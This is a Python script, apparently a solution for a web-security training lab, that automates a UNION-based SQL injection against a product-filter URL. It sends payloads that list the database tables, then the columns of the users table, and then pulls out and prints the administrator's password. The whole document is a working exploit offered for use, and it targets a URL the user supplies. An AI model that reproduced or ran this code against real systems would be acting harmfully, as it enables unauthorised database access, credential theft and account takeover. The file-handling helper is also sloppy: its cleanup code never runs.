#SQL injection attack, listing the database contents on non-Oracle databases
import requests
import os
import re

url = input("enter url : ")
path = "filter?category=Corporate+gifts"
payload="'+UNION+SELECT+table_name,+NULL+FROM+information_schema.tables--"

def index(filetxt,keywords,n):
 file=open(filetxt,"r+",encoding="utf8")
 file_line=[line for line in file]
 c=0
 for line in file_line :
     c += 1
     if line.find(keywords) >=0 :
        
         line = c + n
        
         file = open(filetxt)
         lines_to_print = [line]

         for index, line in enumerate(file):
           if ( index in lines_to_print):
             word=line.strip().replace("<th>","").replace("</th>","").replace("~"," : ")
             return(word)
 file.close()

 os.remove(filetxt)

r=requests.get(url+path+payload).text

file = open("filetxt","w+",encoding="utf8")
file.write(r)
file.close()

users = index("filetxt","users_",-1)

payload2="'+UNION+SELECT+column_name,+NULL+FROM+information_schema.columns+WHERE+table_name='"+users+"\'--"
r2=requests.get(url+path+payload2).text

file = open("filetxt2","w+",encoding="utf8")
file.write(r2)
file.close()


password = index("filetxt2","password_",-1)
username = index("filetxt2","username_",-1)


payload3="'+UNION+SELECT+"+username+","+password+"+FROM+"+users+"--"


r3=requests.get(url+path+payload3).text

file = open("filetxt3","w+",encoding="utf8")
file.write(r3)
file.close()

admin_pass=index("filetxt3","administrator",0).replace("<td>","").replace("</td>","")
             
print(admin_pass)
         




   



